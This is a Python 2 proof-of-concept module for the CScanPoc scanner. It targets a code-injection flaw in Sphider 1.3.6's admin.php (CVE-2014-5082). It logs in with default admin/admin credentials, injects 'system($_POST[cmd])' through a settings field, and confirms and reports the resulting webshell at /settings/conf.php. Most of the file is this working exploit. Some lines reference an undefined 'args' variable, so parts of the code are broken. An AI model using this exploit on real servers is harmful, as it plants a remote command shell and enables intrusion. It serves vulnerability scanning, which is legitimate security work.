# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re
import httplib


class Vuln(ABVuln):
    vuln_id = 'Sphider_0001'  # 平台漏洞编号，留空
    name = 'Sphider 1.3.6 /admin.php 代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-07-28'  # 漏洞公布时间
    desc = '''
        sphider admin.php PHP 代码存在注入漏洞缺陷,直接造成命令执行漏洞的产生。
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/34189/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2014-5082'  # cve编号
    product = 'Sphider'  # 漏洞应用名称
    product_version = '1.3.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5390978f-1f6e-4c7a-8590-f5618218b9c4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            login_data = urllib.urlencode({"user": "admin", "pass": "admin"})
            login_url = '{target}'.format(target=self.target)+'/admin/auth.php'
            request = urllib2.Request(login_url, login_data)
            request.add_header(
                'Content-Type', "application/x-www-form-urlencoded")
            request.add_header(
                'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
            response = urllib2.urlopen(request)
            attack_url = args['options']['target'] + '/admin/admin.php'
            payload = "f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5"
            request = urllib2.Request(attack_url, payload)
            request.add_header(
                'Content-Type', "application/x-www-form-urlencoded")
            request.add_header(
                'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
            response = urllib2.urlopen(request)
            content = response.read()
            shell_url = args['options']['target'] + '/settings/conf.php'
            request = urllib2.Request(shell_url, "cmd=echo sphiderwebshell")
            response = urllib2.urlopen(request)
            res = response.read()
            if "sphiderwebshell" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            login_data = urllib.urlencode({"user": "admin", "pass": "admin"})
            login_url = '{target}'.format(target=self.target)+'/admin/auth.php'
            request = urllib2.Request(login_url, login_data)
            request.add_header(
                'Content-Type', "application/x-www-form-urlencoded")
            request.add_header(
                'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
            response = urllib2.urlopen(request)
            attack_url = args['options']['target'] + '/admin/admin.php'
            payload = "f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5"
            request = urllib2.Request(attack_url, payload)
            request.add_header(
                'Content-Type', "application/x-www-form-urlencoded")
            request.add_header(
                'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
            response = urllib2.urlopen(request)
            content = response.read()
            shell_url = args['options']['target'] + '/settings/conf.php'
            request = urllib2.Request(shell_url, "cmd=echo sphiderwebshell")
            response = urllib2.urlopen(request)
            res = response.read()
            if "sphiderwebshell" in res:
                exploit_url = shell_url
                password = 'cmd'
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的Webshell地址为{url} Webshell密码为{password}'.format(
                    target=self.target, name=self.vuln.name, url=exploit_url, password=password))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
